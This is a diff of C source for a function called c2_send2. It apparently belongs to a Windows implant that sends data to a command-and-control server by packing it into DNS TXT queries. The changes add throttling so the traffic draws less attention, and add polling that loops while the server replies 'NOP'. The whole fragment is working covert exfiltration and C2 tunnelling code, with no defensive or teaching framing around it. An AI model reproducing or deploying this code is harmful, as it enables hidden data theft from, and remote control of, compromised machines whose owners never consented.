@@ -492,28 +492,30 @@ int c2_send2(char* msg, int len) {
         strcat(buffer, ".com"); // domain names need a top-level domain
 
         // Send query
-        // TODO: add check for DEFAULT message from server
         loop:
-        status = DnsQuery_A(buffer, DNS_TYPE_TEXT, DNS_QUERY_BYPASS_CACHE | DNS_QUERY_USE_TCP_ONLY | DNS_QUERY_WIRE_ONLY, pSrvList, &result, NULL);
-        if (status != ERROR_SUCCESS && status != ERROR_TIMEOUT && status != WSAETIMEDOUT) {
+        Sleep(500); // so we dont spam connections
+        status = DnsQuery_A(buffer, DNS_TYPE_TEXT, DNS_QUERY_BYPASS_CACHE | DNS_QUERY_USE_TCP_ONLY, pSrvList, &result, NULL);
+        if (status != ERROR_SUCCESS) {
             c2_log("[!] c2_send2:DnsQuery_A failed with status %d\n", status);
             return 0;
-        }
-        if (status == ERROR_TIMEOUT || status == WSAETIMEDOUT) {
-            // TODO maybe sleep
-            c2_log("Iteration\n");
-            goto loop;
         }
 
         // Get response
         DNS_RECORD record = result[0];
+        
+        // If we get a NOP response, go back into the loop
+        if (strcmp(record.Data.TXT.pStringArray[0], "NOP") == 0) {
+            c2_log("NOP\n");
+            goto loop;
+        }
+
         c2_log("Name: %s\nData: %s\n", record.pName, record.Data.TXT.pStringArray[0]);
         
         num_sent += amount_to_copy;
+        DnsRecordListFree(result, DnsFreeRecordList);
     }
 
     c2_log("[+] DNS query success");
-    DnsRecordListFree(result, DnsFreeRecordList);
     return num_sent;
 }
 
